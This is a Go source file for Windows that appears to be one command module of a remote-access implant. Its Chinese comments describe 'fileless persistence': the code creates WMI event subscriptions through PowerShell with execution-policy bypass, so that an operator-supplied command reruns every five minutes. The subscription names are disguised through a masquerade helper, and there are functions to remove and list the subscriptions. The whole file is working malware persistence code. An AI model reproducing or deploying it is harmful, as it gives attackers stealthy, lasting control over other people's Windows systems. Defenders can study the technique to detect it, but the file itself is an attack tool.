//go:build windows

package commands

import (
	"fmt"
	"strings"
)

// ===== A3: WMI 无文件持久化 =====
// 通过 WMI 事件订阅（__EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding）
// 实现无文件持久化：不落盘可执行文件，仅依赖 WMI 存储。
// 支持 add / remove / list 三种操作。

var (
	wmiPersistFilterName   = masquerade("EvtFilter")
	wmiPersistConsumerName = masquerade("EvtConsumer")
)

// CmdWmiPersist WMI 持久化命令入口
// cmdBuf: "add <command>" | "remove" | "list"
func CmdWmiPersist(cmdBuf []byte) ([]byte, error) {
	args := strings.TrimSpace(string(cmdBuf))
	parts := strings.SplitN(args, " ", 2)
	action := strings.ToLower(parts[0])

	switch action {
	case "add":
		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
			return nil, fmt.Errorf("用法: wmi_persist add <command>")
		}
		return wmiPersistAdd(strings.TrimSpace(parts[1]))
	case "remove":
		return wmiPersistRemove()
	case "list":
		return wmiPersistList()
	default:
		return nil, fmt.Errorf("用法: wmi_persist add <command> | remove | list")
	}
}

// wmiPersistAdd 创建 WMI 事件订阅（每 300 秒触发一次）
func wmiPersistAdd(command string) ([]byte, error) {
	// 转义单引号（PowerShell 字符串）
	escaped := strings.ReplaceAll(command, "'", "''")

	ps := fmt.Sprintf(`
$ErrorActionPreference='Stop'
try {
  $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='%s'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"} 2>$null
  $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='%s'; CommandLineTemplate='%s'} 2>$null
  Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} 2>$null
  Write-Output "WMI_PERSIST_ADD_OK"
} catch {
  Write-Output ("WMI_PERSIST_ADD_ERR: " + $_.Exception.Message)
}
`, wmiPersistFilterName, wmiPersistConsumerName, escaped)

	out, err := execWithTimeout("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err != nil {
		return nil, fmt.Errorf("powershell 执行失败: %v", err)
	}
	result := strings.TrimSpace(string(out))
	if strings.Contains(result, "WMI_PERSIST_ADD_OK") {
		return []byte("[+] WMI 持久化已添加（每 5 分钟触发）: " + command), nil
	}
	return []byte("[!] " + result), nil
}

// wmiPersistRemove 删除 WMI 事件订阅（清理持久化）
func wmiPersistRemove() ([]byte, error) {
	ps := fmt.Sprintf(`
$ErrorActionPreference='SilentlyContinue'
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match '%s'} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'" | Remove-WmiObject
Write-Output "WMI_PERSIST_REMOVE_DONE"
`, wmiPersistFilterName, wmiPersistFilterName, wmiPersistConsumerName)

	out, err := execWithTimeout("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err != nil {
		return nil, fmt.Errorf("powershell 执行失败: %v", err)
	}
	_ = out
	return []byte("[+] WMI 持久化已清理"), nil
}

// wmiPersistList 列出已存在的 WMI 事件订阅
func wmiPersistList() ([]byte, error) {
	ps := `
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query | Format-List
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate | Format-List
`
	out, err := execWithTimeout("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err != nil {
		return nil, fmt.Errorf("powershell 执行失败: %v", err)
	}
	if len(out) == 0 {
		return []byte("(未发现 WMI 事件订阅)"), nil
	}
	return out, nil
}
